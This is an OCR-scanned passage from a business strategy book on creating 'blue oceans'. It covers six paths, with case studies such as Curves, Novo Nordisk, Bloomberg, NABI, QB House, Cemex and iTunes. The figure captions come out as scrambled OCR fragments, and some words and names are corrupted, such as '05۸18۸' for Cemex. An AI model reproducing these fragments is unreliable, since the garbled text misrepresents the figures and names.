afford to spend one to two hours at a health\nclub several times a week. For the mass of women, the city center locations\nalso present traffic challenges, something that increases stress and\ndiscourages going to the gym.\n\nIt turns out that most women trade up to health clubs for one principal\nreason. When they are at home, it’s too easy to find an excuse for not\nworking out. It is hard to be disciplined in the confines of one’s home if you\nare not already a committed sports enthusiast. Working out collectively,\ninstead of alone, is more motivating and inspiring. Conversely, women who\nuse home exercise programs do so primarily for the time saving, lower costs,\nand privacy.\n\nCurves built its blue ocean by drawing on the distinctive strengths of these\ntwo strategic groups, eliminating and reducing everything else (see figure 3-\n2). Curves eliminated all the aspects of the traditional health club that are of\nlittle interest to the broad mass of women. Gone are the profusion of special\nmachines, food, spa, pool, and even locker rooms, which have been replaced\nby a few curtained-off changing areas.\n\nThe experience in a Curves club was entirely different from that in a\ntypical health club. The member entered the exercise room where the\nmachines (typically about ten) were arranged, not in rows facing a television\nas in the health club, but in a circle to facilitate interchange among members,\nmaking the experience fun. The QuickFit circuit training system used\nhydraulic exercise machines, which needed no adjusting and were safe,\nsimple to use, and nonthreatening. Specifically designed for women, these\nmachines reduced impact stress and built strength and muscle. While\nexercising, members could talk and support one another, and the social,\nnonjudgmental atmosphere was totally different from that of a typical health\nclub. There were few if any mirrors on the wall, and there were no men\nstaring at you. Members moved around the circle of machines and aerobic\npads and in thirty minutes completed the whole workout. The result of\nreducing and focusing service on the essentials was that prices fell to around\n$30 per month, opening the market to the broad mass of women. Curves’\ntagline could have been “for the price of a cup of coffee a day you can obtain\nthe gift of health through proper exercise.”\n\nFIGURE 3-2\n\nThe strategy canvas of Curves\n«et\n=\n------\nঢ\nb\n\nCurves\n\n[ , Home exercise\n۰\n7 / program\n\n+\n\n厂 丶 Traditonal\n`_ health 01005\n\n一 - 一 伟 一 -\nLow\n| | | | ۱\nPrice Workout Availability of Nonthreatening Womanly\n\nequipment instructors same-sex fun\nAmenities (treadmills, Workout Environment environ- Conven- atmos-\nweights, time encouraging ment ience phere\n\netc.) discipline\nand motivation\nin exercise\n\nCurves offered the distinctive value depicted in figure 3-2 at a lower cost.\nCompared with the start-up investment of $500,000 to $1 million for\ntraditional health clubs, start-up investments for Curves were in the range of\nonly $25,000 to $30,000 (excluding a $20,000 franchise fee) because of the\nwide range of factors the company eliminated. Variable costs were also\nsignificantly lower, with personnel and maintenance of facilities\ndramatically reduced and rent reduced because of the much smaller spaces\nrequired: 1,500 square feet in nonprime suburban locations versus 35,000 to\n100,000 square feet in prime urban locations. Curves’ low-cost business\nmodel made its franchises easy to afford and helps explain why they\nmushroomed quickly. Most franchises were profitable within a few months,\nas soon as they recruited on average one hundred members.\n\nThe result is that Curves did not compete directly with other health and\nexercise concepts; it created new demand. Today, twenty years out, it has\nnearly ten thousand clubs worldwide serving more than four million\nmembers.* Despite bumps along the way, it has become the largest women’s\nfitness franchise in the world.\n\nBeyond Curves, many companies have created blue oceans by looking\nacross strategic groups. Ralph Lauren created the blue ocean of “high\nfashion with no fashion.” Its designer name, the elegance of its stores, and\nthe luxury of its materials capture what most customers value in haute\ncouture. At the same time, its updated classical look and price capture the\nbest of the classical lines such as Brooks Brothers and Burberry. By\ncombining the most attractive factors of both groups and eliminating or\nreducing everything else, Polo Ralph Lauren not only captured share from\nboth segments but also drew many new customers into the market. In the\nluxury car market, Toyota’s Lexus carved out a new blue ocean by offering\nthe quality of the high-end Mercedes, BMW, and Jaguar at a price closer to\nthe lower-end Cadillac and Lincoln.\n\nMichigan-based Champion Enterprises identified a similar opportunity by\nlooking across two strategic groups in the housing industry: makers of\nprefabricated housing and on-site developers. Prefabricated houses were\nhistorically cheap and quick to build, but they were also dismally\nstandardized with a low-quality image. Houses built by developers on-site\noffer variety and an image of high quality but are dramatically more\nexpensive and take longer to build.\n\nChampion created a blue ocean by offering the decisive advantages of\nboth strategic groups. Its prefabricated houses were quick to build and\nbenefited from tremendous economies of scale and lower costs, but\nChampion also allowed buyers to choose such high-end finishing touches as\nfireplaces, skylights, and even vaulted ceilings to give the homes a personal\nfeel. In essence, Champion changed the definition of prefabricated housing.\nAs a result, more low-and middle-income buyers became interested in\npurchasing prefabricated housing rather than renting or buying an apartment,\nand even some affluent people were drawn into the market. It was only the\nfinancial crisis of 2008 that put a damper on this blue ocean strategic move,\nhitting Champion hard as it hit the rest of the US housing industry.\nWhat are the strategic groups in your industry? Why do customers trade\nup for the higher group, and why do they trade down for the lower one?\nPath 3: Look Across the Chain of Buyers\n\nIn most industries, competitors converge around a common definition of\nwho the target buyer is. In reality, though, there is a chain of “buyers” who\nare directly or indirectly involved in the buying decision. The purchasers\nwho pay for the product or service may differ from the actual users, and in\nsome cases there are important influencers as well. Although these three\ngroups may overlap, they often differ. When they do, they frequently hold\ndifferent definitions of value. A corporate purchasing agent, for example,\nmay be more concerned with costs than the corporate user, who is likely to\nbe far more concerned with ease of use. Similarly, a retailer may value a\nmanufacturer’s just-in-time stock replenishment and innovative financing.\nBut consumer purchasers, although strongly influenced by the channel, do\nnot value these things.\n\nIndividual companies in an industry often target different customer\nsegments—for example, large versus small customers. But an industry\ntypically converges on a single buyer group. The pharmaceutical industry,\nfor example, focuses overridingly on influencers: doctors. The office\nequipment industry focuses heavily on purchasers: corporate purchasing\ndepartments. And the clothing industry sells predominantly to users.\nSometimes there is a strong economic rationale for this focus. But often it is\nthe result of industry practices that have never been questioned.\n\nChallenging an industry’s conventional wisdom about which buyer group\nto target can lead to the discovery of a new blue ocean. By looking across\nbuyer groups, companies can gain new insights into how to redesign their\nvalue curves to focus on a previously overlooked set of buyers.\n\nThink of Novo Nordisk, the Danish insulin producer that created a blue\nocean in the insulin industry. Insulin is used by diabetics to regulate the\nlevel of sugar in their blood. Historically, the insulin industry, like most of\nthe pharmaceutical industry, focused its attention on the key influencers:\ndoctors. The importance of doctors in affecting the insulin purchasing\ndecision of diabetics made doctors the target buyer group of the industry.\nAccordingly, the industry geared its attention and efforts to produce purer\ninsulin in response to doctors’ quest for better medication. The issue was\nthat innovations in purification technology had improved dramatically by\nthe early 1980s. As long as the purity of insulin was the major parameter\nupon which companies competed, little progress could be made further in\nthat direction. Novo itself had already created the first “human\nmonocomponent” insulin that was a chemically exact copy of human\ninsulin. Competitive convergence among the major players was rapidly\noccurring.\n\nNovo Nordisk, however, saw that it could break away from the\ncompetition and create a blue ocean by shifting the industry’s long-standing\nfocus on doctors to the users—patients themselves. In focusing on patients,\nNovo Nordisk found that insulin, which was supplied to diabetes patients in\nvials, presented significant challenges in administering. Vials left the patient\nwith the complex and unpleasant task of handling syringes, needles, and\ninsulin, and of administering doses according to his or her needs. Needles\nand syringes also evoked unpleasant feelings of social stigmatism for\npatients. And patients did not want to fiddle with syringes and needles\noutside their homes, a frequent occurrence because many patients must\ninject insulin several times a day.\n\nThis led Novo Nordisk to the blue ocean opportunity of NovoPen.\nNovoPen, the first user-friendly insulin delivery solution, was designed to\nremove the hassle and embarrassment of administering insulin. The\nNovoPen resembled a fountain pen; it contained an insulin cartridge that\nallowed the patient to easily carry, in one self-contained unit, roughly a\nweek’s worth of insulin. The pen had an integrated click mechanism,\nmaking it possible for even blind patients to control the dosing and\nadminister insulin. Patients could take the pen with them and inject insulin\nwith ease and convenience without the embarrassing complexity of syringes\nand needles.\n\nTo dominate the blue ocean it had unlocked, Novo Nordisk followed this\nup by introducing NovoLet, a prefilled disposable insulin injection pen with\na dosing system that provided users with even greater convenience and ease\nof use. And it later brought out the Innovo, an integrated electronic memory\nand cartridge-based delivery system. Innovo was designed to manage the\ndelivery of insulin through built-in memory and to display the dose, the last\ndose, and the elapsed time—information that is critical for reducing risk\nand eliminating worries about missing a dose.\nNovo Nordisk’s blue ocean strategy shifted the industry landscape and\ntransformed the company from an insulin producer to a diabetes care\ncompany. NovoPen and the later delivery systems swept over the insulin\nmarket. Sales of insulin in prefilled devices or pens now account for the\ndominant share in Europe, Asia, and Scandinavia, where patients are\nadvised to take frequent injections of insulin every day. Today, almost thirty\nyears since its initial blue ocean strategic move, Novo Nordisk remains the\nglobal leader in diabetes care, with some 70 percent of its total turnover\ncoming from this offering, which originated largely in the company’s\nthinking in terms of users rather than influencers.\n\nSimilarly, consider Bloomberg. In a little more than a decade, Bloomberg\nbecame one of the largest and most profitable business-information\nproviders in the world. Until Bloomberg’s debut, Reuters and Telerate\ndominated the online financial-information industry, providing news and\nprices in real time to the brokerage and investment community. The\nindustry focused on purchasers—IT managers—who valued standardized\nsystems, which made their lives easier.\n\nThis made no sense to Bloomberg. Traders and analysts, not IT\nmanagers, make or lose millions of dollars for their employers each day.\nProfit opportunities come from disparities in information. When markets are\nactive, traders and analysts must make rapid decisions. Every second\ncounts.\n\nSo Bloomberg designed a system specifically to offer traders better\nvalue, one with easy-to-use terminals and keyboards labeled with familiar\nfinancial terms. The systems also have two flat-panel monitors so that\ntraders can see all the information they need at once without having to open\nand close numerous windows. Because traders must analyze information\nbefore they act, Bloomberg added a built-in analytic capability that works\nwith the press of a button. Before, traders and analysts had to download\ndata and use a pencil and calculator to perform important financial\ncalculations. After Bloomberg, users could quickly run “what if’ scenarios\nto compute returns on alternative investments, and they could perform\nlongitudinal analyses of historical data.\n\nBy focusing on users, Bloomberg was also able to see the paradox of\ntraders’ and analysts’ personal lives. They have tremendous income but\nwork such long hours that they have little time to spend it. Realizing that\nmarkets have slow times during the day when little trading takes place,\nBloomberg decided to add information and purchasing services aimed at\nenhancing traders’ personal lives. Well before the internet offered such\nservices, traders could use Bloomberg online services to buy items such as\nflowers, clothing, and jewelry; make travel arrangements; get information\nabout wines; or search through real estate listings.\n\nBy shifting its focus upstream from purchasers to users, Bloomberg\ncreated a value curve that was radically different from anything the industry\nhad seen before. The traders and analysts wielded their power within their\nfirms to force IT managers to purchase Bloomberg terminals.\n\nMany industries afford similar opportunities to create blue oceans. By\nquestioning conventional definitions of who can and should be the target\nbuyer, companies can often see fundamentally new ways to unlock value.\nConsider how Canon copiers created the small desktop copier industry by\nshifting the target customer of the copier industry from corporate purchasers\nto users. Or how SAP shifted the customer focus of the business application\nsoftware industry from the functional user to the corporate purchaser to\ncreate its enormously successful real-time integrated software business.\n\nWhat is the chain of buyers in your industry? Which buyer group does\nyour industry typically focus on? If you shifted the buyer group of your\nindustry, how could you unlock new value?>\nPath 4: Look Across Complementary Product and\nService Offerings\n\nFew products and services are used in a vacuum. In most cases, other\nproducts and services affect their value. But in most industries, rivals\nconverge within the bounds of their industry’s product and service offerings.\nTake movie theaters. The ease and cost of getting a babysitter and parking\nthe car affect the perceived value of going to the movies. Yet these\ncomplementary services are beyond the bounds of the movie theater industry\nas it has been traditionally defined. Few cinema operators worry about how\nhard or costly it is for people to get babysitters. But they should, because it\naffects demand for their business. Imagine a movie theater with a babysitting\nservice.\n\nUntapped value is often hidden in complementary products and services.\nThe key is to define the total solution buyers seek when they choose a\nproduct or service. A simple way to do so is to think about what happens\nbefore, during, and after your product is used. Babysitting and parking the\ncar are needed before people can go to the movies. Operating and\napplication software are used along with computer hardware. In the airline\nindustry, ground transportation is used after the flight but is clearly part of\nwhat the customer needs to travel from one place to another.\n\nConsider NABI, a Hungarian bus company that was recently acquired by\nNew Flyer. It applied path 4 to the $1 billion-plus US transit bus industry.\nThe major customers in the industry are public transport properties (PTPs),\nmunicipally owned transportation companies serving fixed-route public bus\ntransportation in major cities or counties.\n\nUnder the accepted rules of competition in the industry, companies long\ncompeted to offer the lowest purchase price. Designs were outdated, delivery\ntimes were late, quality was low, and the price of options was prohibitive\ngiven the industry’s penny-pinching approach. To NABI, however, none of\nthis made sense. Why were bus companies focused only on the initial\npurchase price of the bus, when municipalities kept buses in circulation for\ntwelve years on average? When it framed the market in this way, NABI saw\ninsights that had escaped the entire industry.\nNABI discovered that the highest-cost element to municipalities was not\nthe price of the bus per se, the factor the whole industry competed on, but\nrather the costs that came after the bus was purchased: the maintenance of\nrunning the bus over its twelve-year life cycle. Repairs after traffic\naccidents, fuel usage, wear and tear on parts that frequently needed to be\nreplaced due to the bus’s heavy weight, preventive body work to stop\nrusting, and the like—these were the highest-cost factors to municipalities.\nWith new demands for clean air being placed on municipalities, the cost for\npublic transport not being environmentally friendly was also beginning to be\nfelt. Yet despite all these costs, which outstripped the initial bus price, the\nindustry had virtually overlooked the complementary activity of\nmaintenance and life-cycle costs.\n\nThis made NABI realize that the transit bus industry did not have to be a\ncommodity-price-driven industry but that bus companies, focusing on selling\nbuses at the lowest possible price, had largely made it that way. By looking\nat the total solution of complementary activities, NABI created a bus unlike\nany the industry had seen before. Buses were normally made from steel,\nwhich was heavy, corrosive, and hard to repair after accidents because entire\npanels had to be replaced. NABI adopted fiberglass in making its buses, a\npractice that killed five birds with one stone. Fiberglass bodies substantially\ncut the costs of preventive maintenance by being corrosion-free. It made\nbody repairs faster, cheaper, and easier because fiberglass does not require\npanel replacements for dents and accidents; rather, damaged parts are simply\ncut out and new fiberglass materials are easily soldered. At the same time, its\nlight weight (30-35 percent lighter than steel) cut fuel consumption and\nemissions substantially, making the buses more environmentally friendly.\nMoreover, its light weight allowed NABI to use not only lower-powered\nengines but also fewer axles, resulting in lower manufacturing costs and\nmore space inside the bus.\n\nFIGURE 3-3\n\nThe strategy canvas of the US municipal bus industry, circa 2001\nHigh\n\nNABI\n\nh Average US transit bus\n\nLow\n\nInitial Corrosion Maintenance Fuel Environmental — Aesthetic Customer\npurchase cost consumption , friendliness design friendliness\n1 [ __._ |\nprice\n\nLife-cycle costs\n\nIn this way, NABI created a value curve that was radically divergent from\nthe industry’s average curve. As you can see in figure 3-3, by building its\nbuses in lightweight fiberglass, NABI eliminated or significantly reduced\ncosts related to corrosion prevention, maintenance, and fuel consumption. As\na result, even though NABI charged a higher initial purchase price than the\naverage price of the industry at the time, it offered its buses at a much lower\nlife-cycle cost to municipalities. With much lighter emissions, the NABI\nbuses raised the level of environmental friendliness high above the industry\nstandard. Moreover, the higher price NABI charged allowed it to create\nfactors unprecedented in the industry, such as modern aesthetic design and\ncustomer friendliness, including lower floors for easy mounting and more\nseats for less standing. These boosted demand for transit bus service,\ngenerating more revenues for municipalities. NABI changed the way\nmunicipalities saw their revenues and costs involved in transit bus service.\nNABI created exceptional value for the buyers—in this case for both\n\nmunicipalities and end users—at a low life-cycle cost. Municipalities and\nriders loved NABI’s new buses, with ridership expanding by as much as 30\npercent when NABI’s new buses were deployed.°\n\nSimilarly, consider the British teakettle industry, which, despite its\nimportance to British culture, had flat sales and shrinking profit margins\nuntil Philips Electronics came along with a teakettle that turned the red\nocean blue. By thinking in terms of complementary products and services,\nPhilips saw that the biggest issue the British had in brewing tea was not in\nthe kettle itself but in the complementary product of water, which had to be\nboiled in the kettle. The issue was the lime scale found in tap water. The lime\nscale accumulated in kettles as the water was boiled, and later found its way\ninto the freshly brewed tea. The phlegmatic British typically took a teaspoon\nand went fishing to capture the off-putting lime scale before drinking home-\nbrewed tea. To the kettle industry, the water issue was not its problem. It was\nthe problem of another industry—the public water supply.\n\nBy thinking in terms of solving the major pain points in customers’ total\nsolution, Philips saw the water problem as its opportunity. The result: Philips\ncreated a kettle having a mouth filter that effectively captured the lime scale\nas the water was poured. Lime scale would never again be found swimming\nin British home-brewed tea. The industry was again kick-started on a strong\ngrowth trajectory as people began replacing their old kettles with the new\nfiltered kettles.\n\nThere are many other examples of companies that have followed this path\nto create a blue ocean. Just think of Dyson, which designs its vacuum\ncleaners to eliminate the cost and annoyance of having to buy and change\nvacuum cleaner bags. Dyson entered the US vacuum cleaner market in 2002.\nBack then, the total size of the vacuum cleaner market in the United States\nwas around $4 billion. Market leaders, including Hoover, Electrolux, and\nOreck made modest money on the sale of their basic units, which typically\nsold for between $75 and $125. However, by eliminating vacuum cleaner\nbags and all the cost and hassle of buying new bags for the life of the\nvacuum, Dyson leapfrogged the competition, grew the industry, and was\nable to sell its vacuums for nearly triple the price of the rest of the industry.\n\nWhat is the context in which your product or service is used? What\nhappens before, during, and after? Can you identify the pain points? How\ncan you eliminate these pain points through a complementary product or\nservice offering?\nPath 5: Look Across Functional or Emotional Appeal\nto Buyers\n\nCompetition in an industry tends to converge not only on an accepted notion\nof the scope of its products and services but also on one of two possible\nbases of appeal. Some industries compete principally on price and function\nlargely on calculations of utility; their appeal is rational. Other industries\ncompete largely on feelings; their appeal is emotional.\n\nYet the appeal of most products or services is rarely intrinsically one or\nthe other. Rather it is usually a result of the way companies have competed\nin the past, which has unconsciously educated consumers on what to expect.\nCompanies’ behavior affects buyers’ expectations in a reinforcing cycle.\nOver time, functionally oriented industries become more functionally\noriented; emotionally oriented industries become more emotionally oriented.\nNo wonder market research rarely reveals new insights into what attracts\ncustomers. Industries have trained customers on what to expect. When\nsurveyed, they echo back: more of the same for less.\n\nWhen companies are willing to challenge the functional-emotional\norientation of their industry, they often find new market space. We have\nobserved two common patterns. Emotionally oriented industries offer many\nextras that add price without enhancing functionality. Stripping away those\nextras may create a fundamentally simpler, lower-priced, lower-cost business\nmodel that customers would welcome. Conversely, functionally oriented\nindustries can often infuse commodity products with new life by adding a\ndose of emotion and, in so doing, can stimulate new demand.\n\nTwo well-known examples are Swatch, which transformed the\nfunctionally driven budget watch industry into an emotionally driven fashion\nstatement, or The Body Shop, which did the reverse, transforming the\nemotionally driven industry of cosmetics into a functional, no-nonsense\ncosmetics house. In addition, consider the experience of QB (Quick Beauty)\nHouse. QB House created a blue ocean in the Japanese barbershop industry\nand is rapidly growing throughout Asia. Started in 1996 in Tokyo, QB House\nblossomed from one outlet in 1996 to more than two hundred shops in 2003.\nThe number of visitors surged from 57,000 in 1996 to 3.5 million annually\nin 2002. Today QB House has 463 franchise outlets in Japan and 79\nfranchise outlets in Hong Kong, Singapore, and Taiwan.\n\nAt the heart of QB House’s blue ocean strategy is a shift in the Asian\nbarbershop industry from an emotional industry to a highly functional one.\nIn Japan the time it takes to get a man’s haircut hovers around one hour.\nWhy? A long process of activities is undertaken to make the haircutting\nexperience a ritual. Numerous hot towels are applied, shoulders are rubbed\nand massaged, customers are served tea and coffee, and the barber follows a\nritual in cutting hair, including special hair and skin treatments such as blow\ndrying and shaving. The result is that the actual time spent cutting hair is a\nfraction of the total time. Moreover, these actions create a long queue for\nother potential customers. The price of this haircutting process is 3,000 to\n5,000 yen ($27 to $45).\n\nQB House changed all that. It recognized that many people, especially\nworking professionals, do not wish to waste an hour on a haircut. So QB\nHouse stripped away the emotional service elements of hot towels, shoulder\ntubs, and tea and coffee. It also dramatically reduced special hair treatments\nand focused mainly on basic cuts. QB House then went one step further,\neliminating the traditional time-consuming wash-and-dry practice by\ncreating the “air wash” system—an overhead hose that is pulled down to\n“vacuum” every cut-off hair. This new system works much better and faster,\nwithout getting the customer’s head wet. These changes reduced the\nhaircutting time from one hour to ten minutes. Moreover, outside each shop\nis a traffic light system that indicates when a haircut slot is available. This\nremoves waiting time uncertainty and eliminates the reservation desk.\n\nIn this way, QB House was able to reduce the price of a haircut to 1,000\nyen ($9) versus the industry average of 3,000 to 5,000 yen ($27—$45) while\nraising the hourly revenue earned per barber nearly 50 percent, with lower\nstaff costs and less required retail space per barber. QB House created this\n“no-nonsense” haircutting service with improved hygiene. It introduced not\nonly a sanitation facility set up for each chair but also a “one-use” policy,\nwhere every customer is provided with a new set of towel and comb. To\nappreciate its blue ocean creation, see figure 3-4.\n\nFIGURE 3-4\nThe strategy canvas of QB House\n\nHigh\nQB House\n\nPrice Extra Hygiene Time savings\nReservation services Range of hair Time savings “on haircut “High-\ndesk (other than treatments on waiting performance\nhaircutting) “air wash”\n\nsystem\n\nCemex, one of the world’s largest cement producers, is another company\nthat created a blue ocean by shifting the orientation of its industry—this time\nin the reverse direction, from functional to emotional. In Mexico, cement\nsold in retail bags to the average do-it-yourselfer represents some 85 percent\nof the total cement market.’ As it stood, however, the market was\nunattractive. There were far more noncustomers than customers. Even\nthough most poor families owned their own land and cement was sold as a\nrelatively inexpensive functional input material, the Mexican population\nlived in chronic overcrowding. Few families built additions, and those that\ndid took on average four to seven years to build only one additional room.\nWhy? Most of families’ extra money was spent on village festivals,\nquinceafieras (girls’ fifteen-year birthday parties), baptisms, and weddings.\n\nContributing to these important milestone events was a chance to distinguish\noneself in the community, whereas not contributing would be a sign of\narrogance and disrespect.\n\nAs aresult, most of Mexico’s poor had insufficient and inconsistent\nsavings to purchase building materials, even though having a cement house\nwas the stuff of dreams in Mexico. Cemex conservatively estimated that this\nmarket could grow to be worth $500 million to $600 million annually if it\n\ncould unlock this latent demand.®\n\nCemex’s answer to this dilemma came with its launch of the Patrimonio\nHoy program, which shifted the orientation of cement from a functional\nproduct to the gift of dreams. When people bought cement they were on the\npath to building rooms of love, where laughter and happiness could be\nshared—what better gift could there be? At the foundation of Patrimonio\nHoy was the traditional Mexican system of tandas, a traditional community\nsavings scheme. In a tanda, ten individuals (for example) contribute 100\npesos per week for ten weeks. In the first week, lots are drawn to see who\n“wins” the 1,000 pesos ($93) in each of the ten weeks. All participants win\nthe 1,000 pesos one time only, but when they win, they receive a large\namount to make a large purchase.\n\nIn traditional tandas, the “winning” family would spend the windfall on\nan important festive or religious event such as a baptism or marriage. In the\nPatrimonio Hoy, however, the supertanda is directed toward building room\nadditions with cement. Think of it as a form of wedding registry, except that\ninstead of giving, for example, silverware, Cemex positioned cement as a\nloving gift.\n\nAt its debut, the Patrimonio Hoy building materials club that Cemex set\nup consisted of a group of roughly seventy people contributing on average\n120 pesos each week for seventy weeks. The winner of the supertanda each\nweek, however, did not receive the total sum in pesos but rather received the\nequivalent building materials to complete an entire new room. Cemex\ncomplemented the winnings with the delivery of the cement to the winner’s\nhome, construction classes on how to effectively build rooms, and a\ntechnical adviser who maintained a relationship with the participants during\ntheir project. The result: Patrimonio Hoy participants build their homes or\nadditions three times faster at a lower cost than the norm in Mexico.\nWhereas Cemex’s competitors sold bags of cement, Cemex was selling a\ndream, with a business model involving innovative financing and\nconstruction know-how. Cemex went a step further, throwing small\nfestivities for the town when a room was finished and thereby reinforcing the\nhappiness it brought to people and the tanda tradition.\n\nSince the company launched this new emotional orientation of Cemex\ncement coupled with its funding and technical services, demand for its\ncement soared. As of 2012, the Patrimonio Hoy program benefited 1.9\nmillion individuals and 380,000 families. For more than fifteen years,\n05۸18۸ has been contributing to solving the housing shortage in\nunderserved areas through its Patrimonio Hoy program. The predictability of\nthe quantities of cement sold through the program has also contributed to\ndropping Cemex’s cost structure via lower inventory costs, smoother\nproduction runs, and guaranteed sales that lower costs of capital. Social\npressure makes defaults on supertanda payments rare. Overall, Cemex\ncreated a blue ocean of emotional cement that achieved differentiation at a\nlow cost and has won multiple awards, including the UN Programme’s 2006\nWorld Business Award in support of the UN Millennium Development Goals\nand the 2009 UN Habitat Award for Best Practices in Affordable Housing\nSolutions.\n\nSimilarly, with its wildly successful Viagra, Pfizer shifted the focus from\nmedical treatment to lifestyle enhancement. Likewise, consider how\nStarbucks turned the coffee industry on its head by shifting its focus from\ncommodity coffee sales to the emotional atmosphere in which customers\nenjoy their coffee.\n\nA burst of blue ocean creation has been under way in a number of service\nindustries but in the opposite direction—moving from an emotional to a\nfunctional orientation. Relationship businesses, such as insurance, banking,\nand investing, have relied heavily on the emotional bond between broker and\nclient. They are ripe for change. Direct Line Group, a UK insurance\ncompany, for example, has done away with traditional brokers. It reasoned\nthat customers would not need the hand-holding and emotional comfort that\nbrokers traditionally provide if the company did a better job of, for example,\npaying claims rapidly and eliminating complicated paperwork. So instead of\nusing brokers and regional branch offices, Direct Line uses information\ntechnology to improve claims handling, and it passes on some of the cost\nsavings to customers in the form of lower insurance premiums. For more\nthan twenty years since its inception, Direct Line’s blue ocean strategic\nmove has been winning customers and awards including that for the best,\nmost trusted, and most innovative motor insurance brand in the UK. In the\nUnited States, The Vanguard Group (in index funds) and Charles Schwab (in\nbrokerage services) did the same thing in the investment industry, creating a\nblue ocean by transforming emotionally oriented businesses based on\npersonal relationships into high-performance, low-cost functional\nbusinesses.\n\nDoes your industry compete on functionality or emotional appeal? If you\ncompete on emotional appeal, what elements can you strip out to make it\nfunctional? If you compete on functionality, what elements can be added to\nmake it emotional?\nPath 6: Look Across Time\n\nAll industries are subject to external trends that affect their businesses over\ntime. Think of the rapid rise of the cloud or the global movement toward\nprotecting the environment. Looking at these trends with the right\nperspective can show you how to create blue ocean opportunities.\n\nMost companies adapt incrementally and somewhat passively as events\nunfold. Whether it’s the emergence of new technologies or major regulatory\nchanges, managers tend to focus on projecting the trend itself. That is, they\nask in which direction a technology will evolve, how it will be adopted,\nwhether it will become scalable. They pace their own actions to keep up\nwith the development of the trends they’re tracking.\n\nBut key insights into blue ocean strategy rarely come from projecting the\ntrend itself. Instead they arise from business insights into how the trend will\nchange value to customers and impact the company’s business model. By\nlooking across time—from the value a market delivers today to the value it\nmight deliver tomorrow—managers can actively shape their future and lay\nclaim to a new blue ocean. Looking across time is perhaps more difficult\nthan the previous approaches we’ve discussed, but it can be made subject to\nthe same disciplined approach. We’re not talking about predicting the\nfuture, something that is inherently impossible. Rather, we’re talking about\nfinding insight in trends that are observable today.\n\nThree principles are critical to assessing trends across time. To form the\nbasis of a blue ocean strategy, these trends must be decisive to your\nbusiness, they must be irreversible, and they must have a clear trajectory.\nMany trends can be observed at any one time—for example, a discontinuity\nin technology, the rise of a new lifestyle, or a change in regulatory or social\nenvironments. But usually only one or two will have a decisive impact on\nany particular business. Having identified a trend of this nature, you can\nthen look across time and ask yourself what the market would look like if\nthe trend were taken to its logical conclusion. Working back from that\nvision of a blue ocean strategy, you can identify what must be changed\ntoday to unlock a new blue ocean.\n\nFor example, Apple observed the flood of illegal music file sharing that\nbegan in the late 1990s. Music file sharing programs such as Napster,\nKazaa, and LimeWire had created a network of internet-savvy music lovers\nfreely, yet illegally, sharing music across the globe. By 2003 more than two\nbillion illegal music files were being traded every month. While the\nrecording industry fought to stop the cannibalization of physical CDs,\nillegal digital music downloading continued to grow.\n\nWith the technology out there for anyone to digitally download music\nfree instead of paying $19 for an average CD at the time, the trend toward\ndigital music was clear. This trend was underscored by the fast-growing\ndemand for MP3 players that played mobile digital music, such as Apple’s\nhit iPod. Apple capitalized on this decisive trend with a clear trajectory by\nlaunching the iTunes online music store in 2003.\n\nIn agreement with five major music companies—BMG, EMI Group,\nSony, Universal Music Group, and Warner Brothers Records—iTunes\noffered legal, easy-to-use, and flexible a la carte song downloads. At its\ndebut, iTunes allowed buyers to freely browse two hundred thousand songs,\nlisten to thirty-second samples, and download an individual song for 99\ncents or an entire album for $9.99. By allowing people to buy individual\nsongs and strategically pricing them far more reasonably, iTunes broke a\nkey customer annoyance factor: the need to purchase an entire CD when\nthey wanted only one or two songs on it.\n\niTunes also leapt past free downloading services, providing sound quality\nas well as intuitive navigating, searching, and browsing functions. To\nillegally download music, you first had to search for the song, album, or\nartist. If you were looking for a complete album, you had to know the\nnames of all the songs and their order. It was rare to find a complete album\nto download in one location. The sound quality was consistently poor\nbecause most people burn CDs at a low bit rate to save space. And most of\nthe tracks available reflected the tastes of sixteen-year-olds, so although\ntheoretically there were billions of tracks available, the scope was limited.\n\nIn contrast, Apple’s search and browsing functions are considered the\nbest in the business. Moreover, iTunes music editors included a number of\nadded features traditionally found in music stores, including iTunes\nessentials such as Best Hair Bands or Best Love Songs, staff favorites,\ncelebrity play lists, and Billboard charts. And the iTunes sound quality is\nthe highest because iTunes encoded songs in a format called AAC, which\noffered sound quality superior to MP3s, even those burned at a very high\ndata rate.\n\nCustomers have been flocking to iTunes, and recording companies and\nartists are also winning. Under iTunes they receive some 70 percent of the\npurchase price of digitally downloaded songs, at last financially benefiting\nfrom the digital downloading craze. In addition, at the time Apple further\nprotected recording companies by devising copyright protection that would\nnot inconvenience users—who had grown accustomed to the freedom of\ndigital music in the post-Napster world—but would satisfy the music\nindustry. At its outset, the iTunes Music Store allowed users to burn songs\nonto iPods and CDs up to seven times, enough to easily satisfy music lovers\nbut far too few times to make professional piracy an issue.\n\nToday iTunes offers more than 37 million songs as well as movies, TV\nshows, books, and podcasts. It has now sold more than 25 billion songs,\nwith users downloading on average fifteen thousand songs per minute.\niTunes is estimated to account for more than 60 percent of the global digital\nmusic download market. Apple’s iTunes has unlocked a blue ocean in\ndigital music that it has dominated for more than a decade, with the added\nadvantage of increasing the attractiveness of its long popular iPod player.\nAs other online stores zoom in on this market, the challenge for Apple will\nbe to keep its sights on the evolving mass market and not to fall into\ncompetitive benchmarking or high-end niche marketing.\n\nSimilarly, Cisco Systems created a new market space by thinking across\ntime trends. It started with a decisive and irreversible trend that had a clear\ntrajectory: the growing demand for high-speed data exchange. Cisco looked\nat the world as it was and concluded that the world was hampered by slow\ndata rates and incompatible computer networks. Demand was exploding as,\namong other factors, the number of internet users was doubling roughly\nevery one hundred days. So Cisco could clearly see that the problem would\ninevitably worsen. Cisco’s routers, switches, and other networking devices\nwere designed to create breakthrough value for customers, offering fast data\nexchanges in a seamless networking environment. Thus Cisco’s insight to\ncreate a blue ocean was as much about value innovation as it was about\ntechnology.\nSimilarly, a host of other companies have created blue oceans by\napplying path 6. Consider how CNN created the first real-time twenty-four-\nhour global news network based on the rising tide of globalization. Or how\nHBO’s hit show Sex and the City acted on the trend of increasingly urban\nand successful women who struggle to find love and marry later in life and\ncreated a blue ocean that lasted six years. The show, which still airs in\nsyndication, was listed as one of Time magazine’s “The 100 Best TV Shows\nof All-TIME.”\n\nWhat trends have a high probability of impacting your industry, are\nirreversible, and are evolving in a clear trajectory? How will these trends\nimpact your industry? Given this, how can you open up unprecedented\ncustomer utility?\nConceiving New Market Space\n\nBy thinking across conventional boundaries of competition, you can see how\nto make convention-altering, strategic moves that reconstruct established\nmarket boundaries and create blue oceans. The process of discovering and\ncreating blue oceans is not about predicting or preempting industry trends.\nNor is it a trial-and-error process of implementing wild new business ideas\nthat happen to come across managers’ minds or intuition. Rather, 